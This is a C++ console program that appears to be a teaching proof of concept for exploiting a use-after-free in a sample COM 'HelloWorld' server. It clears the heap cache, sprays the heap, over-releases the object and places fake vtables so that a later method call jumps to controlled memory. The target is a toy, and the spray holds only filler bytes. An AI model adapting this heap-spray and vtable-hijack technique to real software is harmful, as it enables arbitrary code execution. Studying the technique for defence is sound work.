// ComClientExample.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "ComClientExample.h"
#include "ComServerExample_i.h"
#include <iostream>
#include <vector>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define BLOCKSIZE 0x1000000/4 - 0x100


// The one and only application object

CWinApp theApp;

using namespace std;

void TestRef(IHelloWorld* obj) {
	IHelloWorld* newObj;
	newObj = obj;
	newObj->AddRef();
	newObj->PrintSomething("Oh hi");
	newObj->Release();
}

LPVOID MakeFakeObject() {
	HANDLE hProcHeap = GetProcessHeap();
	unsigned char buf[] =
		"\xf0\x0b\x0c\x0c"  // Fake pointer to QueryInterface()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to AddRef()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to Release()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to GetTypeInfoCount()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to GetTypeInfo()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to GetIDsOfNames()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to Invoke()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to PrintSomething()
		"\xf0\x0b\x0c\x0c"  // Fake pointer to _E
		"\xf0\x0b\x0c\x0c"  // Fake pointer for pointer padding
		"\xf0\x0b\x0c\x0c"; // Fake pointer for pointer padding
	LPVOID fakeObj = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, 0x2c);
	memcpy(fakeObj, buf, 0x2c);
	return fakeObj;
}

void HeapSpray() {
	HANDLE hProcHeap = GetProcessHeap();
	for (int i = 0; i < 100; i++) {
		LPVOID h = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, BLOCKSIZE);
		memset(h, 0x41, BLOCKSIZE - 1);
	}
}

void TakeOverObject() {
	for (int i = 0; i < 0x20; i++) {
		LPVOID fakeObj = MakeFakeObject();
		printf("Address for fake object: 0x%08x\n", fakeObj);
	}
}

void Plunge() {
	LPVOID fakeObjects[0x40];

	// Fill the cache
	for (int i = 0; i < 0x40; i++) {
		fakeObjects[i] = MakeFakeObject();
	}

	// Clear the cache
	HANDLE hProcHeap = GetProcessHeap();
	for (int i = 0; i < 0x40; i++) {
		HeapFree(hProcHeap, HEAP_NO_SERIALIZE, fakeObjects[i]);
	}

	// At this point, we have a clear cache
}

void TestComServerSample() {
	IClassFactory* factory;
	IUnknown* pIUnk;
	IHelloWorld* obj;
	HRESULT r;
	ULONG refCount = 0;

	// Some Windows systems require the allocation cache to be cleared in order to have a more
	// predictable overwrite
	Plunge();

	// Spray the payload
	HeapSpray();

	CoInitialize(NULL);
	r = CoGetClassObject(CLSID_HelloWorld, CLSCTX_INPROC, NULL, IID_IClassFactory, (void**)&factory);
	if (!SUCCEEDED(r)) {
		cout << "Failed to do CoGetClassObject" << endl;
		return;
	}

	r = factory->CreateInstance(NULL, IID_IUnknown, (void**)&pIUnk);
	if (!SUCCEEDED(r)) {
		cout << "Failed to do CreateInstance" << endl;
		return;
	}

	r = pIUnk->QueryInterface(IID_IHelloWorld, (void**)&obj);
	if (!SUCCEEDED(r)) {
		cout << "Failed to do QueryInterface" << endl;
		return;
	}

	// QueryInterface calls AddRef on the object, so that gives us an extra reference count. Free it.
	obj->Release();

	// The extra Release() here basically causes the use-after-free condition because the
	// reference counter is 0.
	obj->Release();

	// If the object is freed, this following call will allow the fake object to gain control.
	TakeOverObject();

	// This is our crash
	obj->PrintSomething("Hello World");

	refCount = obj->Release();
	cout << "Last known reference count: " << refCount << endl;
	factory->Release();
}

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// initialize MFC and print and error on failure
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: change error code to suit your needs
			_tprintf(_T("Fatal Error: MFC initialization failed\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: code your application's behavior here.
		}
	}
	else
	{
		// TODO: change error code to suit your needs
		_tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
		nRetCode = 1;
	}

	TestComServerSample();

	return nRetCode;
}
